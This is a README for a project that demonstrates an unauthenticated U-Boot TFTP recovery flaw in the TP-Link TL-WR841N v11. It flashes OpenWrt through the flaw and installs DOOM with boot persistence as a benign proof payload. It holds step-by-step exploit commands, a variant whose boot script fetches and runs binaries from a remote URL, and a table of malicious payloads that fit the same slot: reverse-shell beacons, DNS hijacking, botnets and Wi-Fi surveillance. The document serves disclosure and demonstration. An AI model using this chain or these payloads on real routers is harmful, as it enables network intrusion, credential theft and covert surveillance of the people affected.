# DOOM on a TP-Link TL-WR841N v11

> *"Can it run DOOM?" — yes, and on a $25 router from 2015 whose vendor stopped
> shipping security updates years ago, using the same technique a bad actor
> would use to turn that same router into a hidden foothold on your network.*

This project demonstrates a **real, present, physical-access vulnerability**
in the TP-Link TL-WR841N v11 — an unauthenticated U-Boot TFTP recovery that
lets anyone with a $3 cable and a minute of unsupervised access replace the
entire firmware with code of their choosing — and then uses that same
vulnerability to install **1993's DOOM** as a visibly non-malicious proof
that the attack is **payload-agnostic**.

> **The actual proof of concept is not DOOM. It is this:**
>
> *If this exploit chain can put DOOM on your router, the same four steps
> can put spyware, a packet logger, a DNS hijacker, a Wi-Fi evil-twin, a
> C2 backdoor, or **a through-wall motion sensor that watches the people
> in the room** on your router — with no modification whatsoever to the
> attack. Only the file we `scp` at the end changes.*
>
> DOOM is the audience-friendly stand-in. A real attacker's payload would
> be invisible. See [§ The actual proof of concept](#the-actual-proof-of-concept-payload-is-a-choice-doom-is-just-the-visible-one)
> for a concrete breakdown of what else fits in the same slot.

---

## Table of contents

- [What you'll see](#what-youll-see)
- [How it works — in plain English](#how-it-works--in-plain-english)
- [The full exploit chain, visualized](#the-full-exploit-chain-visualized)
- [Three common misconceptions this diagram clears up](#three-common-misconceptions-this-diagram-clears-up)
- [Proof: DOOM really runs on the router, not your laptop](#proof-doom-really-runs-on-the-router-not-your-laptop)
- [Hardware you need](#hardware-you-need)
- [Software prerequisites (on your VM)](#software-prerequisites-on-your-vm)
- [One-time network setup](#one-time-network-setup)
- [Running the whole demo](#running-the-whole-demo)
- [Script subcommand reference](#script-subcommand-reference)
- [Playing the game](#playing-the-game)
- [Why this works (the vulnerability)](#why-this-works-the-vulnerability)
- [The actual proof of concept: payload is a choice](#the-actual-proof-of-concept-payload-is-a-choice-doom-is-just-the-visible-one)
- [Repository layout](#repository-layout)
- [Troubleshooting + logs](#troubleshooting--logs)
- [Credits + references](#credits--references)
- [Legal, ethics, and disclosure](#legal-ethics-and-disclosure)

---

## What you'll see

A live demo runs like this:

1. **A stock TP-Link router**, factory firmware, serial number on the sticker,
   indistinguishable from any you'd find at a hotel reception or in a dusty
   cabinet. Reachable at `http://192.168.0.1/`, `admin`/`admin`.
2. **You hold Reset while plugging the power in**, for 8–10 seconds. One
   physical act. No tools, no secret knowledge.
3. **Within about 60 seconds**, you can `ssh root@192.168.1.1` with no
   password. The router is now a general-purpose Linux computer.
4. **About 10 seconds later**, you open `http://192.168.1.1:8000/` on any
   phone or laptop on the Wi-Fi — and **you're playing DOOM**, rendered on
   the router's CPU, streamed over WebSocket to the browser.
5. **Reboot the router**. Within ~25 seconds, DOOM is back up again on its
   own, no manual action.

Total elapsed time, physical steps included: **under three minutes.**

---

## How it works — in plain English

Two phases. **Only phase 1 is an exploit.** Phase 2 is just logging in and
copying files.

### Phase 1 — Replace the router's firmware with Linux (the actual vulnerability)

The TP-Link TL-WR841N's bootloader (U-Boot 1.1.4) has a built-in "factory
recovery" feature meant for owners who accidentally brick their device. When
you hold the Reset button during power-on, U-Boot enters a recovery mode in
which it:

- Sets `is_auto_upload_firmware=1` (an internal flag).
- Assigns itself the hardcoded client IP `192.168.0.86`.
- Sends a TFTP read-request to the hardcoded server IP `192.168.0.66` for
  a file called `wr841nv11_tp_recovery.bin`.
- Receives the file, checks only a 4-byte TP-Link header magic (`01000000`),
  and writes the bytes straight to its flash chip.
- Reboots.

The intent is reasonable. The implementation has **no authentication of any
kind** — no password, no cryptographic signature on the firmware, no secure
boot, no rollback protection. Whoever is answering TFTP at that moment on
the LAN **gets to pick what the router runs next.**

We exploit this by running a stock, boring TFTP server (`atftpd`) at
`192.168.0.66`, serving the OpenWrt/LEDE 17.01.4 factory image under the
filename the bootloader asks for. The router downloads and flashes OpenWrt
without ever asking who we are.

Public OpenWrt releases include a product-ID header that matches TP-Link's
format, so the 4-byte "verification" passes. We're not forging anything;
we're just using an image that happens to be compatible.

After reboot, the router runs **LEDE 17.01.4** (an OpenWrt fork):
Linux kernel 4.4.92, Dropbear SSH, root account with **no password set.**
LAN IP becomes `192.168.1.1`. Full root shell, no exploit required —
because we installed the OS.

### Phase 2 — Put DOOM on the Linux we installed (not an exploit)

Once Phase 1 is done, there is nothing cleverer going on than
*"copy a program onto a Linux box you have root on, and run it."*

- **Cross-compile `doomgeneric`** for the router's CPU on our laptop. The
  router is a Qualcomm QCA9533 — a 650 MHz, 32 MB RAM, big-endian MIPS 24Kc.
  The upstream `doom-on-router` project defaults to little-endian; we rebuild
  with the matching big-endian toolchain from the OpenWrt ar71xx SDK.
- **Fetch the real DOOM shareware WAD** (`doom1.wad`, SHA1
  `5b2e249b9c5133ec987b3ea77596381dc0d6bc1d`). The full ~4 MB file, not a
  level-trimmed variant — those alias every episode's maps to the same data.
- **`scp` both files to `/tmp` on the router.** `/tmp` is RAM-backed tmpfs,
  because `/overlay` (the only writable flash) has only ~236 KB free after
  OpenWrt installs itself, which doesn't fit the 993 KB binary let alone
  the 4 MB WAD.
- **Launch it.** `doomgeneric` embeds `mongoose`, a tiny HTTP + WebSocket
  server, and listens on port 8000. The HTML/JS it serves to a browser
  opens a WebSocket back to the router; the game streams rendered frames
  out as pixels and reads keypresses in.

That's it. No new vulnerability. The hard part was Phase 1.

### The bonus — making DOOM survive reboots

Because `/tmp` is RAM, a reboot wipes DOOM. We install a tiny shell script
into `/etc/rc.local` (which *does* persist, since it lives in `/overlay`)
that, on every boot:

- Waits up to 60 seconds for the LAN to be ready.
- Downloads `doomgeneric-mips-be` and `doom1.wad` from a plain file server
  running on our laptop (`python3 -m http.server` on port 8080) — with
  **3 retries and file-size verification** per fetch.
- Launches DOOM under a **supervisor shell loop** that respawns on crash,
  and polls port 8000 every 30 seconds — if mongoose's single-threaded
  event loop wedges (a known pathology when a browser disconnects without
  a clean WebSocket close), the supervisor force-kills and respawns in
  under 3 seconds.

So the laptop runs **two different web servers**, doing two different jobs:

| Server | Where | Port | Purpose |
|---|---|---|---|
| **mongoose** (inside `doomgeneric`) | On the router | 8000 | Serves the game to your browser. This is DOOM. |
| **`python3 -m http.server`** | On the laptop | 8080 | Static file store so the router can re-fetch DOOM at boot. Not involved in gameplay. |

Once DOOM is running, your browser talks **directly to the router.** You
could unplug the laptop and keep playing — until the next router reboot.

---

## The full exploit chain, visualized

```mermaid
flowchart TD
    classDef physical fill:#4a3b1e,stroke:#ffb84a,color:#fff4e0,stroke-width:2px
    classDef watch fill:#2d2d4a,stroke:#9999ff,color:#e0e0ff,stroke-width:2px,stroke-dasharray: 6 4
    classDef laptop fill:#1e3a5f,stroke:#4a9eff,color:#e8f1ff,stroke-width:2px
    classDef router fill:#5c1e1e,stroke:#ff6b6b,color:#ffe8e8,stroke-width:2px
    classDef win fill:#4a1e4a,stroke:#c084fc,color:#f3e8ff,stroke-width:3px

    subgraph P1["PHASE 1 — Swap the router's software for Linux (the only real exploit)"]
        direction TB
        A1["👆 Unplug the router,<br/>hold the Reset button,<br/>plug power back in while still holding"]:::physical
        A2["🤖 Router's bootloader sees Reset is held<br/>and enters 'help, I'm broken' recovery mode."]:::router
        A3["🤖 In recovery mode, the router shouts on the network:<br/>'Hey, computer at 192.168.0.66, send me<br/>a fresh copy of my software!'<br/><i>— no password, no signature check, no questions.</i>"]:::router
        A4["💻 Our laptop IS the computer at 192.168.0.66.<br/>It's running a plain, boring file server (atftpd)<br/>that answers: 'Sure, here you go.'<br/><i>The file we hand over is OpenWrt — i.e. Linux —<br/>not the original TP-Link software.</i>"]:::laptop
        A5["🤖 Router writes those bytes into its memory chip<br/>and reboots. It just installed whatever we gave it,<br/>because it never checked who sent it."]:::router
        A6(["🎉 Router is now a Linux computer.<br/>LAN IP changes to 192.168.1.1.<br/>SSH is open. The admin password is empty.<br/>We own it."]):::win
        A1 --> A2 --> A3
        A3 <==> |"Ethernet cable<br/>carries the file"| A4
        A4 --> A5 --> A6
    end

    UART["🔍 The UART cable is a CAMERA, not a weapon.<br/>We clip it to a debug header on the circuit board<br/>and WATCH everything in Phase 1 happen in real time<br/>(text scrolling by: 'reset held → recovery mode →<br/>downloading file → writing to flash → Linux booting').<br/><br/>No firmware bytes travel over this cable.<br/>If you unplugged it, the exploit would still work —<br/>you just wouldn't see it happening."]:::watch
    UART -. "observes Phase 1<br/>(does not touch it)" .-> P1

    A6 -. "same router. same hardware.<br/>but now a Linux box we SSH into as root.<br/>Phase 2 doesn't need a second exploit —<br/>we're just logged in." .-> B1

    subgraph P2["PHASE 2 — Put DOOM on the Linux box (no new exploit — just copy + run)"]
        direction TB
        B1["💻 Build a DOOM program for the router's CPU.<br/><i>The router's chip reads bytes in a weird order<br/>(big-endian MIPS), so a normal DOOM download<br/>won't run — we have to compile one specifically.</i>"]:::laptop
        B2["💻 Grab the real DOOM shareware level file<br/>(doom1.wad, ~4 MB — the full nine levels)."]:::laptop
        B3["💻 Log in to the router over SSH (empty password)<br/>and copy both files into /tmp. Then just run it:<br/><code>./doomgeneric &amp;</code>"]:::laptop
        B4["🤖 doomgeneric has a tiny web server built right in,<br/>listening on port 8000. It renders DOOM frames and<br/>streams them straight to any browser that connects —<br/>and reads your keypresses the same way."]:::router
        B5(["🎮 On any phone or laptop on the Wi-Fi, open<br/>http://192.168.1.1:8000/ — DOOM appears.<br/>Your browser is talking directly to the router;<br/>the laptop isn't in the loop anymore."]):::win
        B1 --> B3
        B2 --> B3
        B3 --> B4 --> B5
    end

    B5 -. "problem: the router's /tmp folder<br/>is just RAM. Reboot wipes DOOM." .-> C1

    subgraph P3["BONUS — Making DOOM survive reboots (two web servers, two different jobs)"]
        direction TB
        C1["🤖 The router has 4 MB of permanent storage total,<br/>and only ~236 KB is free after Linux installs itself.<br/>DOOM alone is 993 KB — 4× too big.<br/>So DOOM has to live in /tmp (RAM) instead."]:::router
        C2["💻 Fix: our laptop runs a SECOND, different web server<br/>(python's http.server on port 8080). This one is NOT<br/>for playing DOOM — it just holds the DOOM files so<br/>the router can re-download them later."]:::laptop
        C3["🤖 We put a tiny startup script in /etc/rc.local<br/>(a file that DOES persist). Every time the router boots,<br/>that script downloads DOOM from our laptop and<br/>launches it. DOOM is back within ~25 seconds of boot."]:::router
        C4(["🎮 Router reboots → DOOM auto-restarts<br/>as long as the laptop is reachable on the LAN.<br/>Unplug the laptop and DOOM won't come back<br/>on the next reboot."]):::win
        C1 --> C2 --> C3 --> C4
    end
```



### Legend

| Marker | What it is |
|---|---|
| 👆 **orange** | A physical thing a human does with their hands. |
| 💻 **blue** | The attacker's laptop (your VM). |
| 🤖 **red** | The router doing something in response. |
| 🔍 **purple dashed** | The UART cable — a **camera**, not a weapon. |
| 🎉 🎮 **pink** | "You win" markers at the end of each phase. |
| **Thick double arrow** (`<==>`) | Where firmware/data bytes actually travel (Ethernet). |
| **Dashed arrow** (`-.->`) | A "same thing, next phase" handoff — no new attack, just continuing. |

---

## Three common misconceptions this diagram clears up

1. **UART does NOT flash the router.** The firmware travels over the Ethernet
   cable, via TFTP. UART only lets us *see* what's happening in real time.
   If you unplugged UART mid-exploit, the exploit would still succeed —
   you just wouldn't see the progress bar.

2. **"TFTP server" sounds hacker-y but it's just a plain file server.**
   The router (as a client) *asks* for a file. Our laptop (as the server)
   *answers*. The vulnerability isn't our server — it's that the router
   never asks "who are you?" or "is this file genuine?".

3. **DOOM isn't flashed into firmware.** Phase 1 flashes OpenWrt (Linux).
   Phase 2 is just `scp` + `./doomgeneric` — the exact two steps you'd use
   to install any program on any Linux server you have root on.

---

## Proof: DOOM really runs on the router, not your laptop

The single most common question when demoing this: *"Is DOOM actually running
on the router, or are you cheating with your laptop in the middle?"*
Here is the live evidence from this working deployment, collected via SSH
directly against the running router.

### Proof 1 — The two machines are different CPUs

```bash
# ─ On the laptop:
$ uname -a
Linux kali 7.1.5+kali-amd64 ... x86_64 GNU/Linux

# ─ Over SSH to 192.168.1.1 (the router):
$ ssh root@192.168.1.1 uname -a
Linux LEDE 4.4.92 ... mips GNU/Linux
```

A x86_64 Linux and a MIPS Linux. Different kernels, different architectures.

### Proof 2 — The game process is on the router

```bash
# ─ SSH to router:
$ ssh root@192.168.1.1 'ps w | grep doomgeneric | grep -v grep'
 1027 root      8424 R    ./doomgeneric

# ─ Laptop, looking for any DOOM process:
$ ps ax | grep -i doom | grep -v grep
(nothing — only python3 ... 8080 for the persistence file server)
```

The game process (PID 1027, state **R**unning, resident set 8.4 MB) exists
on the router. The laptop has no DOOM process.

### Proof 3 — The listening TCP socket on port 8000 is held by `doomgeneric` on the router

```bash
$ ssh root@192.168.1.1 'netstat -ltnp 2>/dev/null | grep :8000'
tcp  0  0  0.0.0.0:8000  0.0.0.0:*  LISTEN  1027/doomgeneric
```

Port 8000 — the port your browser connects to — is bound by PID 1027,
which is `doomgeneric`, on the router. Not forwarded, not proxied.
If the router were off, nothing on the laptop would answer that port.

### Proof 4 — The binary on the router is a big-endian MIPS ELF (cannot run on your x86_64 laptop)

```bash
$ ssh root@192.168.1.1 'dd if=/tmp/doomgeneric bs=1 count=20 2>/dev/null' | xxd
00000000: 7f45 4c46 0102 0100 0100 0000 0000 0000  .ELF............
00000010: 0002 0008                                ....
```

Byte-by-byte: `7f 45 4c 46` is the ELF magic. Byte 4 (`01`) is 32-bit.
Byte 5 (**`02`**) is **big-endian**. Byte 18-19 (`00 08`) is **MIPS**.
This exact binary **cannot execute on your x86_64 laptop at all** — the
kernel would reject the architecture mismatch. It only runs on the router.

### Proof 5 — Established TCP connections to :8000 come from browser clients, not from the laptop as an intermediary

```bash
$ ssh root@192.168.1.1 'netstat -tn | grep :8000'
tcp  0  0  192.168.1.1:8000  192.168.1.66:50898  ESTABLISHED
tcp  0  0  192.168.1.1:8000  192.168.1.66:50884  ESTABLISHED
```

Each `ESTABLISHED` row is a WebSocket from a browser client to the router.
The `Foreign Address` is the browser's own IP (`192.168.1.66` happens to be
the laptop in this test, but connect a phone and you'd see the phone's IP
there instead).

### Proof 6 — The MIPS CPU is actively doing the work

```bash
$ ssh root@192.168.1.1 'cat /proc/loadavg; top -b -n 1 | head -8'
1.31 0.87 0.41 2/43 1054
...
  PID  PPID USER     STAT   VSZ %VSZ %CPU COMMAND
 1027   756 root     R     8312  29%  73% ./doomgeneric
```

Load average 1.31 on a single-core CPU, with `doomgeneric` taking **73% CPU
and 29% of RAM.** This is the game loop rendering frames on the router.
If this were a laptop-side proxy, the router's CPU would be idle.

### If all of that is still not enough — unplug the laptop

The decisive test: once DOOM is running and your browser is connected,
**unplug the laptop entirely** (physical disconnection, or `ifconfig <iface>
down`). The game continues. You can keep playing. Only the next time the
router reboots will DOOM fail to come back, because `rc.local` won't be able
to re-fetch the files from the (now-missing) laptop.

That is, by construction, impossible if the laptop were secretly doing the
rendering.

---

## Hardware you need

| Item | Spec | Notes |
|---|---|---|
| **Target router** | **TP-Link TL-WR841N v11.0** | Hardware version MATTERS. v14 has a different flash layout and the OpenWrt image here will not match. The hardware version is printed on the sticker underneath the case. |
| **Attacker machine** | Linux (Kali recommended) | Can be a VM. Must bridge to the router's LAN at Layer 2 — see [One-time network setup](#one-time-network-setup). |
| **USB-UART adapter** | CP2102 or FT232 (3.3 V TTL) | Any 3.3 V-level USB-serial will do. **Do NOT power the router from the adapter** (board has its own supply). |
| **Jumper wires** | 3× female-to-female | For TX / RX / GND. |
| **Ethernet cable** | — | Direct between the laptop/VM NIC and any router LAN port. |
| **Router's own power supply** | 9 V DC, 0.6 A | The one it shipped with. |

> **Note:** the UART cable is optional for the exploit *itself* — the attack
> succeeds without ever connecting UART. The adapter is for *watching* and
> *proving* what's happening on the router. It's also the fallback way to
> get a root shell on the router even without the TFTP recovery flash,
> because the stock firmware exposes an unauthenticated serial console.

---

## Software prerequisites (on your VM)

```bash
sudo apt install atftpd iputils-arping picocom curl wget python3 openssh-client
```

For building the DOOM binary from source (optional — the compiled binary
is included under `doom/doomgeneric-mips-be`):

```bash
sudo apt install build-essential wget tar xz-utils
```

The build toolchain is the LEDE 17.01.4 ar71xx SDK, already extracted under
`sdk/`. First build run will use it automatically.

---

## One-time network setup

The U-Boot recovery TFTP client sends its request directly on the local
Ethernet segment (ARP, not routed). Your VM must therefore share **Layer 2**
with the router. In a NAT'd libvirt VM this will NOT work out of the box —
you need to bridge the host's physical NIC into the VM's bridge.

### Host (physical machine, outside the VM)

Find your real NIC (not `virbr0`, not `vnet*`, not `lo`):

```bash
ip -br link show
# What's left (eno1 / eth0 / enp3s0 / ...) is your real wired NIC.
```

Bridge it into `virbr0` (substitute real name for `eno1`):

```bash
sudo ip link set eno1 master virbr0
sudo ip link set eno1 up
```

If you want to open DOOM from the **host's** browser too (not just the VM),
also give the host an address on the router's subnet. Put it on `virbr0`,
NOT on the physical NIC directly (bridged ports don't reliably route ARP
replies back up to the host IP stack):

```bash
sudo ip addr add 192.168.1.68/24 dev virbr0
```

### VM

Give the VM-facing NIC the two addresses U-Boot and OpenWrt expect:

```bash
sudo ip addr add 192.168.0.66/24 dev eth1   # TFTP server IP during recovery
sudo ip addr add 192.168.1.66/24 dev eth1   # for post-flash LAN
sudo ip link set eth1 up
```

Verify L2 adjacency:

```bash
./pwn-router.sh exploit:check-network
# Expect: "Router reachable on L2 via eth1 ✓"
```

If this check fails, the script prints exact fix commands for both host
and VM. Running `check-network` is also baked into `exploit:flash-openwrt`,
so you can skip the manual check if you want.

---

## Running the whole demo

### Fastest path — three commands

```bash
# 0. (One-time) Verify L2 bridge.
./pwn-router.sh exploit:check-network

# 1. Flash OpenWrt via the unauthenticated TFTP recovery.
#    Prompts you to do the physical reset-hold at the right moment.
./pwn-router.sh exploit:flash-openwrt

# 2. Cross-compile DOOM (if needed), scp it, launch it, install persistence.
./pwn-router.sh doom:all
```

Then open `http://192.168.1.1:8000/` on any phone or laptop on the Wi-Fi.

### What each phase actually prints

- `exploit:flash-openwrt` opens a UART capture, prints the reset-hold
  instructions, waits for the TFTP transfer to complete, and verifies the
  LEDE kernel comes up by pinging 192.168.1.1. Total time: ~90 seconds
  including the physical act.

- `doom:all` runs five internal steps: build (skipped if the binary is
  already present), WAD fetch (skipped if the WAD is already present),
  deploy (scp + size-verify + launch under supervisor), persist (install
  rc.local + start the laptop's HTTP server), status. Total time: ~6
  seconds end-to-end on a cached build.

### Testing persistence

```bash
./pwn-router.sh doom:reboot
# Reboots the router over SSH, waits for it to come back,
# and polls port 8000 until DOOM responds (typically within ~25s of ping).
```

### Resetting back to the demo-starting state

```bash
./pwn-router.sh doom:clean          # Removes DOOM, strips rc.local, stops local HTTP.
./pwn-router.sh exploit:flash-stock # Flashes the original TP-Link firmware back.
```

### Running the one-time-physical variant (`exploit:flash-remote-doom`)

This is the "attacker walks away after one visit and never comes back"
flow described in [§ How often does the attacker need to be present?](#how-often-does-the-attacker-need-to-be-present).
Instead of flashing stock OpenWrt and then separately `scp`-ing DOOM, you
flash a custom OpenWrt image that already contains an `/etc/rc.local`
pointing at a public URL. The router self-fetches DOOM at every boot.

**Extra prerequisite:**

```bash
sudo apt install build-essential   # provides 'make' for the OpenWrt Image Builder
```

First run of this subcommand also downloads ~30 MB of the OpenWrt ar71xx
17.01.4 Image Builder, cached under `sdk/imagebuilder/` for subsequent runs.

**1. Choose where to host `doomgeneric-mips-be` and `doom1.wad`.**
The URL you supply must serve both files at `<url>/doomgeneric-mips-be`
and `<url>/doom1.wad`. Two realistic options:

| Hosting | URL shape | Attacker's post-flash presence |
|---|---|---|
| **Local-LAN** — your laptop running `python3 -m http.server` on 192.168.1.66:8080 | `http://192.168.1.66:8080` | Still on LAN while demoing; auditable in one room |
| **Public internet** — GitHub release, S3/R2/B2 bucket, your VPS, or a temporary ngrok tunnel of your local server | e.g. `https://github.com/<you>/<repo>/releases/download/<tag>` | **Zero** — the attacker never has to be on the LAN again |

For Option 2 ("real" one-time-physical demo), the router's **WAN port**
must be plugged into something that routes to the internet (home gateway,
tethered phone, uplink switch). The router gets DHCP on the WAN side
automatically — it's a stock OpenWrt default.

**2. Run the subcommand.** Power the router off first:

```bash
./pwn-router.sh exploit:flash-remote-doom http://192.168.1.66:8080
#                                          ^^^^^^^^^^^^^^^^^^^^^^^
#                                          or your public URL from Option 2
```

Five steps print:

1. **Preflight** — confirms UART, atftpd, and `make` are present.
2. **Image Builder** — downloads on first run (~30 MB), unpacks, caches.
3. **Composes `/etc/rc.local`** — writes the baked-in fetcher pointing at your URL.
4. **Builds the custom image** — runs `make image PROFILE=TLWR841v11 FILES=<overlay>`. Takes ~30-60 s on first build.
5. **Flashes** — identical to `exploit:flash-openwrt` from this point on: prompts you for the reset-hold, verifies via UART capture.

**3. Verify, after ~30-45 s of boot time:**

```bash
./pwn-router.sh doom:status
# Expect:
#   [+] DOOM is running + serving — http://192.168.1.1:8000/ ✓
#   [+] supervisor: RUNNING
#   [+] persistence: INSTALLED
```

Open `http://192.168.1.1:8000/` in a browser.

**4. If the fetch failed** (bad URL, router has no WAN internet, hosting
down), inspect the baked-in rc.local's own log:

```bash
./pwn-router.sh doom:logs
```

The `/tmp/doom_boot.log` section shows which fetches succeeded or failed,
after how many of the 3 attempts, and with what sizes. The baked-in
script fails cleanly if nothing is reachable — the router just boots
without DOOM, nothing crashes.

**5. The money-shot demo moment (Option 2 hosting only):**

Once `doom:status` shows DOOM running, **physically unplug your laptop's
Ethernet cable from the LAN.** The game keeps running — browsers on
other devices on the Wi-Fi can still play it, because the game is on the
router. Then power-cycle the router. Boot, br-lan up, WAN gets DHCP
from your home internet, baked-in rc.local fetches from the public URL,
`doomgeneric` launches. **You were never on its LAN after Phase 1.**

That's the one-time-physical proof of concept delivered in one gesture.

**6. Clean up:**

```bash
./pwn-router.sh exploit:flash-stock   # Reverts to the original TP-Link firmware.
```

**A gotcha worth knowing for the defender side.** The custom image's
`/etc/rc.local` — including the full URL you baked in — is **plain text
inside the firmware's squashfs**. Anyone who pulls the flash chip off
the board after the attack and extracts the image can read exactly where
the attacker was hosting their files. That's a legitimate forensic
opportunity, and worth mentioning in a defender-focused demo: the opaque
part of a real attack is usually the *payload* being downloaded, not the
fetcher.

---

## Script subcommand reference

Run `./pwn-router.sh` with no arguments for the full list. Highlights:

### `exploit:*` — the base vulnerability chain

| Command | What it does |
|---|---|
| `exploit:check-network` | L2/bridge adjacency diagnostic. Prints exact fix commands if the VM isn't bridged correctly. |
| `exploit:flash-openwrt` | Full chain: stage firmware → arm TFTP → prompt for reset-hold → verify boot → report. |
| `exploit:flash-stock` | Flash the original TP-Link firmware back (demo cleanup). |
| `exploit:status` | Which firmware is currently running (stock vs. OpenWrt). |
| `exploit:ssh` | SSH to the router using the right legacy-KEX flags for Dropbear 2017.75. |
| `exploit:reboot` | SSH reboot + wait for it back. |

### `doom:*` — the payload demo (needs OpenWrt flashed first)

| Command | What it does |
|---|---|
| `doom:all` | build → wad → deploy → persist → status. End-to-end in ~6s on a cached build. |
| `doom:build` | Cross-compile `doomgeneric` for big-endian MIPS. Skipped if a verified binary is present. |
| `doom:wad` | Fetch + SHA1-verify the full shareware `doom1.wad`. |
| `doom:deploy` | Pre-flight free-space check → scp binary+wad → verify sizes → launch under supervisor → poll until :8000 serves. |
| `doom:persist` | Install `/etc/rc.local` with retry-on-fail fetches + supervisor + start the laptop's HTTP server. |
| `doom:serve` | Run the firmware HTTP server in the foreground. For debugging. |
| `doom:status` | Full state readout: process, listening socket, persistence, supervisor, free space, log tail. |
| `doom:reboot` | SSH reboot the router → poll until DOOM is serving again. End-to-end persistence test. |
| `doom:restart` | Kill `doomgeneric`; supervisor respawns it in ~2s. Fast fix for a wedged event loop. |
| `doom:clean` | Full teardown: kill supervisor + game, wipe `/tmp` artifacts, strip rc.local DOOM block, stop local HTTP. |
| `doom:logs` | Aggregate recent logs: `/tmp/doom.log`, `/tmp/doom_boot.log` (on router), `/tmp/doom_httpd.log` (laptop). |
| `doom:ssh` | SSH to router (alias of `exploit:ssh`). |

### Design notes about the subcommands

- **SSH multiplexing (ControlMaster)** is on for every router call — the
  second SSH drops from ~2 seconds to ~15 ms. A multi-step deploy spends
  ~0.5 seconds total in SSH overhead instead of ~3.
- **Every "wait for ready"** is a poll loop with a bounded timeout, never a
  blind `sleep N`. Fast successes don't wait; slow failures still cap out.
- **Deployed files are size-verified** on the router after scp (using
  `wc -c`, because busybox on this image has no `stat` applet). If scp
  truncates or corrupts, the launch step aborts with a diagnostic instead
  of starting a half-corrupt game.
- **The supervisor** uses parallel healthcheck + `wait` on the game pid, so
  crashes respawn in ~2 seconds and wedges are detected within ~30 seconds.

---

## Playing the game

Open `http://192.168.1.1:8000/` on anything with a modern browser on the LAN.

**Keyboard controls:**

| Key | Action |
|---|---|
| `↑` / `W` | Forward |
| `↓` / `S` | Backward |
| `←` / `A` | Turn left |
| `→` / `D` | Turn right |
| `Q` | Strafe left |
| `R` | Strafe right |
| `E` | Use (doors, switches) |
| `Space` | Fire |
| `Tab` | Automap |
| `Enter` | Menu / confirm |
| `Esc` | Menu / back |
| `Y` / `N` | Confirm or cancel the quit dialog |

> **Fixed bug:** `Y`/`N` weren't in the original `doom-on-router` JS keymap,
> so DOOM's quit confirmation (`Esc` → `Quit` → "are you sure? y/n") could
> never be answered. The build in `doom/doomgeneric-mips-be` includes the
> fix. See `docs/DOOM.md` for the full writeup.

**Touch controls:** render automatically on mobile. Five on-screen buttons —
UP / DOWN / LEFT / RIGHT / FIRE / USE / MAP. No strafe button on touch (use
a keyboard for that).

---

## Why this works (the vulnerability)

Full technical writeup is in `assessment_report.md`. The short version:

- **U-Boot 1.1.4** on this device supports a factory-recovery TFTP download
  path triggered by the Reset button at power-on.
- **Zero authentication** on that path. No boot password, no firmware
  signing, no secure boot chain, no rollback protection.
- **The only "check"** is a 4-byte product-ID header. OpenWrt's factory
  image for this device has that header, so public, auditable firmware
  passes trivially — no magic needed.
- **CVSS 4.0 score: 8.6 (Critical).** The attack vector is **Physical**,
  which lowers mass-exploitation probability but does **not** lower severity.
- **No patch is possible.** The bootloader lives in the first 128 KB of
  the SPI flash chip, and nothing in the device's own update path replaces
  it. The vulnerability outlives firmware upgrades.

The only durable fix is **replacing the device.**

---

## The actual proof of concept: payload is a choice, DOOM is just the visible one

Everything above this section exists to make a single, specific claim
land with teeth:

> **The exploit chain in this project installs *any* payload with no
> modification.** Only the file passed to `scp` at the end changes. The
> vulnerability does not check what the payload is, what the payload does,
> or who the payload reports to. It only checks whether a 4-byte header
> matches `01000000`.

Phase 1 and the bonus persistence setup (`exploit:flash-openwrt` + the
`/etc/rc.local` installer) are **completely payload-agnostic.** The deploy
step (`doom:deploy`) is a thin wrapper around what is, mechanically,
`scp <file> root@router:/tmp/ && ssh root@router ./<file> &`. There is no
line of code anywhere in this chain that says "this is DOOM, do special
handling." A real adversary writes a different file to the end of that
`scp`, and gets a different outcome. **Same chain. Same four steps.**

### Concrete alternatives — what else fits in this exact slot

| If an attacker put ___ instead of DOOM | They would have ___ | Cost (binary size, build complexity) |
|---|---|---|
| **tcpdump + a cron job** | A silent packet logger. Every HTTP header, DNS query, SMTP exchange, telnet login, and FTP credential crossing the LAN is captured to tmpfs and retrievable later. Invisible to any host-based AV. | ~500 KB static MIPS build, trivial |
| **A reconfigured `dnsmasq`** | Full DNS hijack. `your-bank.com`, Signal's push notification host, `addons.mozilla.org`, your corporate SSO — any of them silently redirect to attacker IPs. Appears correct in a browser because the hijack happens before TLS SNI. | ~0 KB — `dnsmasq` is already on the router |
| **A reverse-shell beacon** (Go/Rust, static) | A persistent C2 foothold. The router makes an outbound TCP connection every N seconds to attacker-controlled infrastructure, giving them a long-lived remote shell *inside* the perimeter — invisible to any firewall that only inspects inbound. | ~2 MB static MIPS build, ~30 LOC |
| **Reconfigured `hostapd`** | A Wi-Fi evil-twin. Broadcasts a lookalike SSID with no password, silently captures credentials from any device that joins the wrong one by accident (phones in auto-join lists do this constantly). | ~0 KB — `hostapd` is already on the router |
| **A mitmproxy-style TLS intercept** + an injected CA | HTTPS decryption. Any device that trusts the injected CA (every corporate-managed laptop, every phone through a captive-portal MDM push) has its "secure" traffic decrypted in flight. | ~5 MB static MIPS build |
| **A kernel module or modified busybox** | A persistent rootkit. Hides itself from `ps`, `netstat`, `ls`. Survives firmware upgrades (OpenWrt's own `sysupgrade` keeps `/overlay`). Only a full re-flash via *this same exploit* removes it. | Nontrivial, but documented in multiple public MIPS rootkits |
| **Any binary from a public malware family** | Mirai, Mozi, Moobot, Gafgyt — the classic IoT botnet payloads. Every one has public MIPS BE builds. | 0 effort — they're on GitHub |
| **A CSI (Channel State Information) extractor + ML classifier** (Wi-Fi sensing) | **The router itself becomes a motion sensor.** Published research turns a commodity router's radio into a through-wall occupancy detector, person counter, activity classifier (walking / sitting / falling / cooking), gait-based individual identifier, and even a vital-signs monitor (breathing + heart rate from Wi-Fi alone). The QCA9533 is an Atheros chip; the Atheros CSI Tool and the `ath9k` driver family specifically expose CSI on this chipset. See the dedicated note below. | ~2 MB static MIPS binary + a small CNN; published papers include code |

**Every one of those uses the identical four steps as DOOM:**

1. Hold Reset while powering on. *(Physical act, 10 seconds.)*
2. Flash OpenWrt via TFTP recovery. *(`./pwn-router.sh exploit:flash-openwrt`.)*
3. `scp` the attacker's binary into `/tmp` or `/overlay`. *(The ONE line that
   changes between "DOOM demo" and "complete compromise.")*
4. Append to `/etc/rc.local` for boot persistence. *(Already done by this
   script's `doom:persist` — the attacker just reuses the mechanism.)*

### The qualitatively different one: the router's RADIO becomes a sensor

Every payload in the table above operates on **data that already passes
through the router** — packets, DNS queries, HTTP sessions, credentials.
The CSI / Wi-Fi-sensing row is categorically different: the attacker is
weaponizing the router's **physical radio** as a surveillance device, not
just its software stack. There are no network packets to intercept here.
The router *itself* is now the sensor.

